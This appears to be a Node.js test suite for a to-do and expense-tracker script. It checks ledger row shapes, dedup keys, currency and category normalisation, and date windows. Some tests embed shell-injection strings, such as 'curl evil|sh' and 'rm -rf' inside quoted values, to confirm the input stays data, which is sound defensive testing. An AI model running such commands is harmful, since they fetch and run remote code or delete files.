'use strict';
// push validation and dedup keys — R6 (pending only, ledger_* only, re-run adds
// no rows), R7/R22 (a done must name an open to-do), R9 (9 fixed categories,
// item kept), R20 (§1 payload / start_at / dedup_key shapes).
// TC-S1-7, TC-S1-16, TC-S2-1, TC-S2-2, TC-S2-5, TC-S2-8, TC-S2-9, TC-S2-11.
// Self-repair round 1: R0-4 (date window), R0-5 (unit/day in keys), R0-6 (--file / heredoc input).

const { test } = require('node:test');
const assert = require('node:assert/strict');

const {
  buildRows, doPush, taskKey, expenseKey, doneKey, cleanQuote, parseExtraction,
  normalizeAmount, normalizeCurrency, normalizeCategory,
} = require('../scripts/todo-spend-tracker');

const SRC = '6f1c2a90-0d1e-4c55-9b0b-1a2b3c4d5e6f';
const REF = '2026-10-26';

function extraction(extra = {}) {
  return {
    source_ref: SRC,
    source_kind: 'audio',
    reference_date: REF,
    tasks: [{ item: 'Call the bank about my card', quote: 'I need to call the bank tomorrow about my card' }],
    expenses: [{ item: 'lunch', amount: 12, currency: 'USD', category: 'Food & drink', quote: 'Just paid twelve dollars for lunch' }],
    dones: [],
    ...extra,
  };
}

// In-memory skill_data store that upserts by (type, dedup_key) like the server.
function makeServer(initialRows = []) {
  const store = new Map();
  for (const r of initialRows) store.set(`${r.type}|${r.dedup_key}`, r);
  const posts = [];
  return {
    store,
    posts,
    httpPostJson: async (url, _token, body) => {
      posts.push({ url, body });
      let inserted = 0;
      for (const it of body.items) {
        const k = `${body.type}|${it.dedup_key}`;
        if (!store.has(k)) inserted += 1;
        store.set(k, { ...it, type: body.type });
      }
      return { upserted: inserted, unchanged: body.items.length - inserted, deleted: 0 };
    },
    httpGet: async (url) => {
      const type = new URL(url).searchParams.get('type');
      return { items: [...store.values()].filter((r) => r.type === type) };
    },
  };
}

function memState() {
  const box = { state: {} };
  return { box, loadState: () => JSON.parse(JSON.stringify(box.state)), saveState: (s) => { box.state = JSON.parse(JSON.stringify(s)); } };
}

test('push [R20, TC-S1-16]: rows have the §1 types, payload keys, start_at and dedup_key shapes', () => {
  const { rows, dropped } = buildRows(extraction(), { openKeys: new Set(), referenceDate: REF });
  assert.deepEqual(dropped, []);
  const [t] = rows.ledger_task;
  assert.match(t.dedup_key, new RegExp(`^task:${SRC}:[0-9a-f]{12}$`));
  assert.deepEqual(Object.keys(t.payload).sort(), ['item', 'quote', 'source']);
  assert.equal(t.payload.source, 'recording');
  assert.equal(t.start_at, '2026-10-26T00:00:00');
  assert.equal(t.status, 'pending');
  assert.equal(t.source_ref, SRC);
  const [e] = rows.ledger_expense;
  assert.match(e.dedup_key, new RegExp(`^exp:${SRC}:[0-9a-f]{12}$`));
  assert.deepEqual(Object.keys(e.payload).sort(), ['amount', 'category', 'currency', 'item', 'quote', 'source']);
  assert.deepEqual([e.payload.item, e.payload.amount, e.payload.currency, e.payload.category], ['lunch', 12, 'USD', 'Food & drink']);
  assert.equal(e.start_at, '2026-10-26T00:00:00');
  assert.equal(e.status, 'pending');
});

test('push [R20]: dedup keys are stable and follow task:/exp:/done: shapes', () => {
  assert.equal(taskKey('s1', 'Call the bank'), taskKey('s1', 'call  the bank'.replace(/\s+/g, ' ')));
  assert.notEqual(taskKey('s1', 'Call the bank'), taskKey('s2', 'Call the bank'));
  assert.notEqual(expenseKey('s1', 'lunch', 12, 'USD'), expenseKey('s1', 'lunch', 12, 'CNY'));
  assert.notEqual(expenseKey('s1', 'lunch', 12, 'USD'), expenseKey('s1', 'lunch', 12.5, 'USD'));
  assert.equal(expenseKey('s1', 'lunch', 12, 'USD'), expenseKey('s1', 'Lunch', 12.0, 'USD'));
  assert.equal(doneKey('task:s1:abc', 's9'), 'done:task:s1:abc:s9');
});

test('push [R6, TC-S2-9]: writes only ledger_task / ledger_expense / ledger_done, all pending', async () => {
  const srv = makeServer([{ type: 'ledger_task', dedup_key: 'task:old:aaaaaaaaaaaa', status: 'confirmed', start_at: '2026-10-20T00:00:00', payload: { item: 'Call the dentist' } }]);
  const st = memState();
  await doPush({ token: 't', extraction: extraction({ dones: [{ task_key: 'task:old:aaaaaaaaaaaa', quote: 'called the dentist' }] }),
    ...srv, ...st, emit: () => {} });
  assert.deepEqual(srv.posts.map((p) => p.body.type), ['ledger_task', 'ledger_expense', 'ledger_done']);
  for (const p of srv.posts) {
    assert.equal(p.body.skill, 'todo-spend-tracker');
    assert.equal(p.body.merge, 'upsert');
    assert.ok(p.url.endsWith('/api/skill/data'));
    for (const it of p.body.items) assert.equal(it.status, 'pending');
  }
});

test('push [R6, TC-S1-7, TC-S2-7]: a re-run of the same unit adds no rows', async () => {
  const srv = makeServer();
  const st = memState();
  await doPush({ token: 't', extraction: extraction(), ...srv, ...st, emit: () => {} });
  const n = srv.store.size;
  await doPush({ token: 't', extraction: extraction(), ...srv, ...st, emit: () => {} });
  assert.equal(srv.store.size, n);
  assert.deepEqual(srv.posts[0].body.items, srv.posts[2].body.items);
});

test('push [R7, R22, TC-S2-5]: a done naming an open to-do becomes a pending ledger_done', async () => {
  const open = 'task:old:aaaaaaaaaaaa';
  const srv = makeServer([{ type: 'ledger_task', dedup_key: open, status: 'confirmed', start_at: '2026-10-20T00:00:00', payload: { item: 'Call the bank' } }]);
  let summary;
  await doPush({ token: 't', extraction: extraction({ tasks: [], expenses: [], dones: [{ task_key: open, quote: 'OK, I finally called the bank.' }] }),
    ...srv, ...memState(), emit: (o) => { summary = o; } });
  assert.equal(summary.written.ledger_done, 1);
  const done = srv.posts[0].body.items[0];
  assert.equal(done.dedup_key, `done:${open}:${SRC}`);
  assert.deepEqual(done.payload, { task_key: open, quote: 'OK, I finally called the bank.', source: 'recording' });
  assert.equal(done.status, 'pending');
});

test('push [R22, TC-S2-11]: a done naming no open to-do is dropped', async () => {
  const srv = makeServer([
    { type: 'ledger_task', dedup_key: 'task:p:pppppppppppp', status: 'pending', start_at: '2026-10-20T00:00:00', payload: { item: 'pending one' } },
    { type: 'ledger_task', dedup_key: 'task:c:cccccccccccc', status: 'confirmed', start_at: '2026-10-20T00:00:00', payload: { item: 'closed one' } },
    { type: 'ledger_done', dedup_key: 'done:task:c:cccccccccccc:x', status: 'confirmed', start_at: '2026-10-21T00:00:00', payload: { task_key: 'task:c:cccccccccccc' } },
  ]);
  let summary;
  await doPush({ token: 't', extraction: extraction({ tasks: [], expenses: [], dones: [
    { task_key: 'task:nowhere:ffffffffffff', quote: 'I finished the quarterly report.' },
    { task_key: 'task:p:pppppppppppp', quote: 'done' },
    { task_key: 'task:c:cccccccccccc', quote: 'done again' },
    { quote: 'no key' },
  ] }), ...srv, ...memState(), emit: (o) => { summary = o; } });
  assert.equal(summary.written.ledger_done, 0);
  assert.equal(summary.dropped.filter((d) => d.kind === 'done').length, 4);
  assert.equal(srv.posts.length, 0);
});

test('push [R22]: when the open list cannot be read, dones are dropped but other rows are written', async () => {
  const srv = makeServer();
  srv.httpGet = async () => { const e = new Error('GET -> HTTP 500'); e.status = 500; throw e; };
  let summary;
  await doPush({ token: 't', extraction: extraction({ dones: [{ task_key: 'task:x:1', quote: 'done' }] }),
    ...srv, ...memState(), emit: (o) => { summary = o; } });
  assert.deepEqual(summary.written, { ledger_task: 1, ledger_expense: 1, ledger_done: 0 });
});

test('push [R9]: unknown category, currency or amount drops the expense; the item is kept as said', () => {
  const { rows, dropped } = buildRows(extraction({ tasks: [], expenses: [
    { item: 'gadget', amount: 5, currency: 'USD', category: 'Gadgets' },
    { item: 'thing', amount: 5, currency: 'XYZ', category: 'Shopping' },
    { item: 'stuff', amount: 'some', currency: 'USD', category: 'Shopping' },
    { item: 'nothing', amount: 0, currency: 'USD', category: 'Shopping' },
    { item: '', amount: 3, currency: 'USD', category: 'Shopping' },
    { item: 'Uber to the airport', amount: '23.456', currency: '$', category: 'transport', quote: 'uber was 23 bucks' },
  ] }), { openKeys: new Set(), referenceDate: REF });
  assert.equal(dropped.length, 5);
  assert.deepEqual(dropped.map((d) => d.reason.split(' ')[0] + ' ' + (d.reason.split(' ')[1] || '')), [
    'unknown category', 'unknown currency', 'unknown amount', 'unknown amount', 'empty item']);
  assert.equal(rows.ledger_expense.length, 1);
  const p = rows.ledger_expense[0].payload;
  assert.deepEqual([p.item, p.amount, p.currency, p.category], ['Uber to the airport', 23.46, 'USD', 'Transport']);
});

test('push [R9]: every one of the 9 categories is accepted exactly', () => {
  for (const c of ['Food & drink', 'Groceries', 'Transport', 'Shopping', 'Bills & subscriptions', 'Entertainment', 'Health', 'Travel', 'Other']) {
    assert.equal(normalizeCategory(c), c);
  }
  assert.equal(normalizeCategory('Food'), null);
});

test('push [R7, TC-S2-8]: Chinese purchase keeps CNY and the user\'s words', () => {
  const { rows } = buildRows(extraction({ tasks: [], expenses: [
    { item: '咖啡', amount: 35, currency: '块', category: 'Food & drink', quote: '我刚花了三十五块钱买咖啡。' },
  ] }), { openKeys: new Set(), referenceDate: REF });
  assert.deepEqual(rows.ledger_expense[0].payload, { item: '咖啡', amount: 35, currency: 'CNY', category: 'Food & drink', quote: '我刚花了三十五块钱买咖啡。', source: 'recording' });
  assert.equal(normalizeCurrency('RMB'), 'CNY');
  assert.equal(normalizeCurrency('¥'), 'CNY');
  assert.equal(normalizeCurrency('usd'), 'USD');
  assert.equal(normalizeCurrency('Bitcoin'), null);
});

test('push [R8, R0-4]: a purchase dated outside last month and this month is dropped, not left unconfirmable', () => {
  const { rows, dropped } = buildRows(extraction({ tasks: [], expenses: [
    { item: 'flights', amount: 300, currency: 'USD', category: 'Travel', date: '2026-08-15' },
    { item: 'wrong year', amount: 9, currency: 'USD', category: 'Other', date: '2025-10-26' },
    { item: 'tomorrow', amount: 9, currency: 'USD', category: 'Other', date: '2026-10-27' },
    { item: 'last month start', amount: 1, currency: 'USD', category: 'Other', date: '2026-09-01' },
    { item: 'today', amount: 2, currency: 'USD', category: 'Other', date: REF },
  ] }), { openKeys: new Set(), referenceDate: REF });
  assert.deepEqual(rows.ledger_expense.map((r) => r.payload.item), ['last month start', 'today']);
  assert.deepEqual(dropped.map((d) => d.item), ['flights', 'wrong year', 'tomorrow']);
  assert.match(dropped[0].reason, /outside last month and this month/);
  // January: last month is the previous year's December.
  const jan = buildRows(extraction({ tasks: [], expenses: [
    { item: 'dec', amount: 1, currency: 'USD', category: 'Other', date: '2026-12-31' },
    { item: 'nov', amount: 1, currency: 'USD', category: 'Other', date: '2026-11-30' },
  ] }), { openKeys: new Set(), referenceDate: '2027-01-05' });
  assert.deepEqual(jan.rows.ledger_expense.map((r) => r.payload.item), ['dec']);
});

test('push [R20, R0-5]: keyboard units of one day get distinct keys; a re-run of the same unit keeps its key', () => {
  const DAY_SESSION = 'a3f1c2d4e5f60718293a4b5c6d7e8f90';
  const kb = (unit) => buildRows({ source_ref: DAY_SESSION, source_kind: 'keyboard', unit, reference_date: REF,
    tasks: [{ item: 'call mom' }], expenses: [{ item: 'coffee', amount: 5, currency: 'USD', category: 'Food & drink' }] },
  { openKeys: new Set(), referenceDate: REF }).rows;
  const morning = kb('kbd:101');
  const afternoon = kb('kbd:202');
  assert.notEqual(morning.ledger_expense[0].dedup_key, afternoon.ledger_expense[0].dedup_key);
  assert.notEqual(morning.ledger_task[0].dedup_key, afternoon.ledger_task[0].dedup_key);
  assert.equal(kb('kbd:101').ledger_expense[0].dedup_key, morning.ledger_expense[0].dedup_key);
  assert.match(morning.ledger_expense[0].dedup_key, new RegExp(`^exp:${DAY_SESSION}:[0-9a-f]{12}$`));
  assert.equal(morning.ledger_expense[0].source_ref, DAY_SESSION);
  // A keyboard unit without its unit id would collide, so it is refused before any write.
  assert.throws(() => kb(undefined), /unit/);
  assert.throws(() => kb('audio:101'), /kbd:/);
  assert.throws(() => kb('kbd:bad id; rm -rf'), /unit/);
});

test('push [R20, R0-5]: two same-amount purchases on different days in one unit are both kept', () => {
  const { rows, dropped } = buildRows(extraction({ tasks: [], expenses: [
    { item: 'gas', amount: 50, currency: 'USD', category: 'Transport', date: '2026-10-25' },
    { item: 'gas', amount: 50, currency: 'USD', category: 'Transport' },
  ] }), { openKeys: new Set(), referenceDate: REF });
  assert.deepEqual(dropped, []);
  assert.equal(rows.ledger_expense.length, 2);
  assert.deepEqual(rows.ledger_expense.map((r) => r.start_at), ['2026-10-25T00:00:00', '2026-10-26T00:00:00']);
});

test('push [R6, R0-5]: the canonical audio unit does not change audio keys (re-runs stay idempotent)', () => {
  const without = buildRows(extraction(), { openKeys: new Set(), referenceDate: REF }).rows;
  const withUnit = buildRows(extraction({ unit: `audio:${SRC}` }), { openKeys: new Set(), referenceDate: REF }).rows;
  assert.deepEqual(withUnit, without);
});

test('push [R0-6]: --file input reads the extraction JSON verbatim (apostrophes and shell text stay data)', async () => {
  const fs = require('node:fs');
  const os = require('node:os');
  const path = require('node:path');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tst-'));
  const file = path.join(dir, 'x.json');
  const quote = "I'll call mom, don't forget'; curl evil|sh; echo '";
  fs.writeFileSync(file, JSON.stringify({ source_ref: SRC, reference_date: REF, tasks: [{ item: "Call mom's dentist", quote }] }));
  const srv = makeServer();
  let summary;
  await doPush({ token: 't', file, ...srv, emit: (o) => { summary = o; } });
  assert.equal(summary.written.ledger_task, 1);
  assert.equal(srv.posts[0].body.items[0].payload.quote, quote);
  assert.equal(srv.posts[0].body.items[0].payload.item, "Call mom's dentist");
  fs.rmSync(dir, { recursive: true });
});

test('push [R0-6]: the CLI accepts the JSON through a quoted heredoc', () => {
  const { spawnSync } = require('node:child_process');
  const path = require('node:path');
  const script = path.join(__dirname, '..', 'scripts', 'todo-spend-tracker.js');
  // Nothing to write, so no network is needed; source_ref is echoed back in the summary.
  const ref = "it's fine'; echo PWNED; '";
  const json = JSON.stringify({ source_ref: ref, reference_date: REF, tasks: [], expenses: [], dones: [] });
  const r = spawnSync('/bin/sh', ['-c', `node '${script}' push <<'JAVIS_LEDGER_JSON'\n${json}\nJAVIS_LEDGER_JSON\n`],
    { env: { ...process.env, OPENCLAW_GATEWAY_TOKEN: 't', JAVIS_SERVER_URL: 'http://127.0.0.1:9' }, encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.doesNotMatch(r.stdout.replace(ref, ''), /PWNED/);
  assert.equal(JSON.parse(r.stdout).source_ref, ref);
  assert.equal(parseExtraction('{"a":"it\'s"}').a, "it's");
  assert.throws(() => parseExtraction(''), /empty/);
});

test('push: an expense with its own date uses that local day; quotes are cut to 25 words', () => {
  const long = Array.from({ length: 40 }, (_, i) => `w${i}`).join(' ');
  const { rows } = buildRows(extraction({ tasks: [], expenses: [
    { item: 'dinner', amount: 50, currency: 'USD', category: 'Food & drink', date: '2026-10-25', quote: long },
    { item: 'snack', amount: 2, currency: 'USD', category: 'Food & drink', date: '2026-02-30' },
  ] }), { openKeys: new Set(), referenceDate: REF });
  assert.equal(rows.ledger_expense[0].start_at, '2026-10-25T00:00:00');
  assert.equal(rows.ledger_expense[1].start_at, '2026-10-26T00:00:00');
  assert.equal(rows.ledger_expense[0].payload.quote.split(' ').length, 25);
  assert.equal(cleanQuote('  a   b '), 'a b');
  assert.equal(normalizeAmount('1,234.5'), 1234.5);
});

test('push: missing source_ref or reference_date is a hard error, no write', () => {
  assert.throws(() => buildRows(extraction({ source_ref: '' }), { openKeys: new Set(), referenceDate: REF }), /source_ref/);
  assert.throws(() => buildRows(extraction(), { openKeys: new Set(), referenceDate: 'today' }), /reference_date/);
});

test('push: duplicates inside one unit are written once', () => {
  const { rows, dropped } = buildRows(extraction({ tasks: [{ item: 'Call the bank' }, { item: 'call the bank' }] }),
    { openKeys: new Set(), referenceDate: REF });
  assert.equal(rows.ledger_task.length, 1);
  assert.equal(dropped[0].reason, 'duplicate in this unit');
});

test('push: without reference_date the local day comes from the user zone, not UTC', async () => {
  const srv = makeServer();
  let summary;
  // 2026-10-27T04:30Z is still Oct 26 in Los Angeles.
  await doPush({ token: 't', extraction: extraction({ reference_date: undefined }), fetchTz: async () => 'America/Los_Angeles',
    now: () => '2026-10-27T04:30:00.000Z', ...srv, ...memState(), emit: (o) => { summary = o; } });
  assert.equal(summary.reference_date, '2026-10-26');
  assert.equal(srv.posts[0].body.items[0].start_at, '2026-10-26T00:00:00');
});
